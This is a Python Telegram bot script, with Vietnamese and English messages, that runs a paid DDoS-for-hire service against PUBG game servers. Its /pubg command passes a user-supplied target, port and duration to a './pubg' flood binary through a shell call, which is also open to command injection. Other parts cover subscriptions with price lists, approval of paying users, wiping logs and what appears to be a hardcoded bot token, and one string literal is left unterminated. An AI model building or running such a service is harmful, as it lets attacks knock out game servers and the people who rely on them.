#bgmiddoserpython

import telebot
import subprocess
import datetime
import os

from keep_alive import keep_alive
keep_alive()
# insert your Telegram bot token here
bot = telebot.TeleBot('6151599157:AAEXFXPYCjjSpCusnHQeALrbEppY32qQdrc')

# Admin user IDs
admin_id = ["7360500930"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    admin_id = ["7360500930"]
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs đã được xóa. Không có dữ liệu nào."
            else:
                file.truncate(0)
                response = "Logs đã được xoá thành công"
    except FileNotFoundError:
        response = "Không tìm thấy logs để xóa."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍."
                else:
                    response = "Đặt ngày hết hạn không thành công. hãy thử lại sau."
            else:
                response = "Người dũng đã tồn tại."
        else:
            response = "Vui lòng nhập ID người cần add và thời gian (e.g., 1hour, 2days, 3weeks, 4months) để thêm."
    

    bot.reply_to(message, response)

# Command handler for retrieving user info
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"👤 Your Info:\n\n🆔 User ID: <code>{user_id}</code>\n📝 Username: {username}\n🔖 Level: {user_role}\n📅 Ngày hết hạn: {user_approval_expiry.get(user_id, 'Not Approved')}\n⏳ Thời gian còn lại: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} Xoá thành công ."
            else:
                response = f"User {user_to_remove} không tìm thấy trong list."
        else:
            response = '''Nhập ID người dùng để xoá. 
  Usage: /remove <userid>'''
    

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Dữ liệu trong logs đã được xóa. Không còn thông tin để hiển thị."
                else:
                    file.truncate(0)
                    response = "Dữ liệu trong logs đã được xoá"
        except FileNotFoundError:
            response = "Logs đã được từ trước."
    
    bot.reply_to(message, response)


@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Dữ liệu users đã được xóa. Không tìm thấy dữ liệu."
                else:
                    file.truncate(0)
                    response = "Xoá thành công các users"
        except FileNotFoundError:
            response = "Các users đã được xoá rồi."
    
    bot.reply_to(message, response)
 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "Không tìm thấy data"
        except FileNotFoundError:
            response = "không có data"
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "Không có data."
                bot.reply_to(message, response)
        else:
            response = "Không có data"
            bot.reply_to(message, response)
  
        bot.reply_to(message, response)


# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀 \n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time}\n𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿 𝗡𝗮𝗺𝗲: {username}\n𝐌𝐞𝐭𝐡𝐨𝐝: PUBG"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['pubg'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "Một cuộc tấn công đang diễn ra. Vui lòng chờ."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 600:
                response = "Error: Time interval must be less than 600."
            else:
                record_command_logs(user_id, '/pubg', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./pubg {target} {port} {time} 500"
                process = subprocess.run(full_command, shell=True)
                response = f"Attack successfully sent! Target: {target} Port: {port} Time: {time}"
                bot.reply_to(message, response)  # Notify the user that the attack is finished
        else:
            response = "Usage :- /pubg <TARGET> <PORT> <TIME>"  # Updated command syntax
    else:
        response = ("🚀 Bạn Không có quyền! 🚀\n\bạn không có quyền dụng lệnh /pubg. Vui lòng liên hệ @Xiaocoder để mua")

    bot.reply_to(message, response)


# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Lịch sử dùng lệnh:\n" + "".join(user_logs)
                else:
                    response = "Không tìm thấy lịch sử lệnh của bạn ."
        except FileNotFoundError:
            response = "Không tìm thấy lịch sử lệnh."
    else:
        response = "Bạn không thể dùng lệnh này."

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''Danh Sách Các Lệnh:
 /pubg : Method Tấn Công Server PUBG
 /rules : Xem quy định trước khi sử dụng !!
 /mylogs : xem các cuộc tấn công gần đây của bạn.
 /plan : Xem bảng giá và gói dịch vụ của botnet.
/myinfo : THÔNG TIN CỦA BẠN .


Buy From :- @xiaocoderz
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''Welcome to Xiao DDoS Bot! 
   
XiaoNam Bot Free and Paid DDoS Attack Services

Type /help to see the attack usage!

----------------------------------------------

Best C2/API Of 2024 -> @Xiaocoderz🚀'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. Không thực hiện quá nhiều cuộc tấn công cùng lúc!! Nếu không bạn sẽ bị ban khỏi bot
2. Không được chạy 2 cuộc tấn công cùng lúc, không thì sẽ bị cấm sử dụng bot
3. Chúng tôi theo dõi nhật ký hàng ngày, vì vậy hãy tuân thủ các quy định này để tránh bị cấm!!
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:

Vip ð :
-> Attack Time : 300 (S)
> After Attack Limit : 10 sec
-> Concurrents Attack : 5

Pr-ice Listð¸ :
Day-->80 Rs
Week-->400 Rs
Month-->1000 Rs
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

/add <userId> : Triệu tập một thành viên mới vào hệ thống.
/remove <userId> : Xóa sổ một tài khoản khỏi cơ sở dữ liệu.
/allusers : Liệt kê các chiến binh đang hoạt động trong mạng lưới.
/logs : Truy xuất toàn bộ lịch sử hoạt động.
/broadcast : Truyền tải thông điệp tới tất cả node.
/clearlogs : Xóa sạch mọi dấu vết từ các nhật ký.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = " Tin Nhắn Được Admin Gửi Đến Tất Cả Users:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Gửi tin nhắn đến người dùng không thành công. {user_id}: {str(e)}")
            response = "Tin nhắn đã được gửi đến tất cả người dùng thành công."
        else:
            response = "Nhập tin nhắn cần gửi đến users."
    else:
        response = "Lệnh Này chỉ dành cho Admin ."

    bot.reply_to(message, response)



#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)


